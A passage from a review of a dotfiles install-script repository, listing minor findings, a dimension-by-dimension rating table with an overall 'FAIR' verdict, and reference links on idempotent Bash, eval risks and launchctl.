| N3  | `**terminal.sh` is trivially simple**         | `scripts/terminal.sh` (20 lines for `touch ~/.hushlogin`)         | Inline into `install.sh` or merge into another script                                                                     |
| N4  | **OSX naming**                                | `scripts/osx-defaults.sh:8,10-12`                                 | Rename function to `apply_macos_system_defaults`; update UI text to say "macOS"                                           |
| N5  | **No version pinning for source-built tools** | `youtube-transcript.sh`, `ani-cli.sh`                             | Check out a specific tag/commit instead of building from HEAD                                                             |
| N6  | **No installation log**                       | `install.sh`                                                      | Tee output to `~/dotfiles-install.log`                                                                                    |
| N7  | **No post-install verification**              | Missing entirely                                                  | Create `scripts/verify.sh` that checks: all symlinks valid, key tools in PATH, shell startup < 500ms, LaunchAgents loaded |
| N8  | `**sync.sh` duplicates color logic**          | `sync.sh:14-18`                                                   | Extract utils.sh sourcing (source via absolute DOTFILES path since sync.sh knows its own location)                        |
| N9  | **Azure DevOps extension install duplicated** | `brew-install.sh:36-48`, `install-arch.sh:99-120`                 | Extract to a shared function or into utils.sh                                                                             |


---

## Summary


| Dimension           | Rating | Notes                                                                                                  |
| ------------------- | ------ | ------------------------------------------------------------------------------------------------------ |
| **Idempotency**     | FAIR   | Most individual scripts are idempotent; overall flow has gaps (LaunchAgent loading, no fast-path skip) |
| **Error Handling**  | POOR   | Half the scripts lack strict mode; no `trap` anywhere; unquoted variables                              |
| **Security**        | FAIR   | `eval` in symlinks is unnecessary risk; pipe-to-bash for Cursor CLI; no secrets in repo (good)         |
| **Completeness**    | POOR   | Brewfile missing 16+ tools; Karabiner config not symlinked; Arch has no symlinks step                  |
| **Consistency**     | POOR   | Two shebang styles, two utils sourcing patterns, two symlink management locations                      |
| **Maintainability** | FAIR   | Hub-and-spoke architecture is sound; per-script independence is good; quality split adds friction      |
| **Automation**      | POOR   | Interactive-only; no CI/container/unattended support                                                   |
| **Documentation**   | FAIR   | CLAUDE.md and README cover the basics; inline comments are sparse in older scripts                     |


**Overall: FAIR** -- The architecture is reasonable and the happy path works. But incomplete Brewfile coverage, inconsistent error handling, and the lack of a non-interactive mode mean a fresh install requires manual intervention beyond what the scripts handle. The three Critical issues (C1-C3) should be addressed promptly as they cause incorrect behavior during installation.

---

## Sources

- [How to write idempotent Bash scripts](https://arslan.io/2019/07/03/how-to-write-idempotent-bash-scripts/)
- [Metaist/idempotent-bash](https://github.com/metaist/idempotent-bash)
- [Coder docs: Workspace Dotfiles](https://coder.com/docs/user-guides/workspace-dotfiles)
- [My tips for maintaining dotfiles in source control](https://opensource.com/article/22/2/dotfiles-source-control)
- [OWASP: Direct Dynamic Code Evaluation - Eval Injection](https://owasp.org/www-community/attacks/Direct_Dynamic_Code_Evaluation_Eval%20Injection)
- [Safely Using Bash eval](https://earthly.dev/blog/safely-using-bash-eval/)
- [macos-defaults.com](https://macos-defaults.com/)
- [kevinSuttle/macOS-Defaults](https://github.com/kevinSuttle/macOS-Defaults)
- [launchctl legacy subcommands deprecated](https://forums.macrumors.com/threads/launchctl-legacy-subcommands-deprecated.2431281/)
- [launchctl new subcommand basics for macOS](https://www.alansiu.net/2023/11/15/launchctl-new-subcommand-basics-for-macos/)
- [launchd.info: A launchd Tutorial](https://www.launchd.info/)
- [mathiasbynens/dotfiles](https://github.com/mathiasbynens/dotfiles)
- [chezmoi.io: Why use chezmoi?](https://www.chezmoi.io/why-use-chezmoi/)
- [chezmoi.io: Comparison table](https://www.chezmoi.io/comparison-table/)
- [dotfiles.github.io](https://dotfiles.github.io/)
- [Missing Semester: Dotfiles](https://missing.csail.mit.edu/2019/dotfiles/)
- [Frictions and Complexities of "Simple" Scripts](https://www.lloydatkinson.net/posts/2024/frictions-and-complexities-of-simple-bash-scripts/)

